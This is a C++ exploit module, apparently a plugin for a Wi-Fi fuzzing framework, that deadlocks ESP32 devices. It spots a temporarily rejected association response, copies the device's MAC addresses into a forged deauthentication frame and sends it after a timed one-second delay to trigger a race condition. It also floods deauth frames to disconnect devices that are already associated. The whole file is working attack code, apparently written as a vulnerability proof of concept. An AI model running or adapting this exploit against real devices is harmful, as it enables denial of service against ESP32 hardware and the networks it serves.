#include "ModulesInclude.hpp"
#include <thread>

// Filters

// Vars

// Setup
const char *module_name()
{
    return "ESP32 Association Desync Deadlock";
}

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.packet_retry = false;
    return 0;
}

static uint8_t packet_deauth[] = {0xc0, 0x0, 0x0, 0x0, 0xa8, 0x3, 0x2a, 0xeb,
                                  0xf5, 0x20, 0x0, 0xc0, 0xca, 0xac, 0xf1, 0x9b,
                                  0x0, 0xc0, 0xca, 0xac, 0xf1, 0x9b, 0x50, 0x61,
                                  0x6, 0x0};

static uint8_t packet_assoc_rsp[256];
static uint16_t packet_assoc_rsp_size;

// TX
static uint8_t flag = 0;
static uint8_t deauth_req = 0;

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (WIFI_Get_FrameSubType(pkt_buf) == WIFI_FRAME_SUBTYPE::WIFI_ASSOCRSP) {
        // Find failed association response from AP.
        // Status could should have 0x1E (Association request rejected temporarily; try again later)
        if (pkt_buf[26] != 0x1E)
            return 0;

        // Copy target and soruce mac addresses from packet
        memcpy(packet_deauth + 4, pkt_buf + 4, 18);
        wd_log_y("Got Bad AssocRsp, Scheduling deauth in 1 second...");
        void *f = p;
        (new std::thread([f]() {
            // Here, 1 second is the key timing to cause an internal race condition on ESP32 state machine
            g_usleep(1000000);
            send_packet(f, packet_deauth, sizeof(packet_deauth));
        }))->detach();

        flag = 0;
    }

    return 0;
}

// RX
int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (!deauth_req && (WIFI_Get_FrameType(pkt_buf) == WIFI_FRAME_TYPE::WIFI_DATA_TYPE)) {
        deauth_req = 1;
        // Copy target mac address from packet
        memcpy(packet_deauth + 4, pkt_buf + 10, 6);
        memcpy(packet_deauth + 10, pkt_buf + 16, 6);
        memcpy(packet_deauth + 16, pkt_buf + 16, 6);
        // Force deauth in case ESP32 is already connected to AP
        wd_log_y("Scheduling 100 deauth packets in 5 seconds");
        send_packet(p, packet_deauth, sizeof(packet_deauth), 1);
        m_set_period_ms(p, 5000);
        void *f = p;
        (new std::thread([f]() {
            g_usleep(5000000);
            deauth_req = 0;
        }))->detach();
    }

    return 0;
}
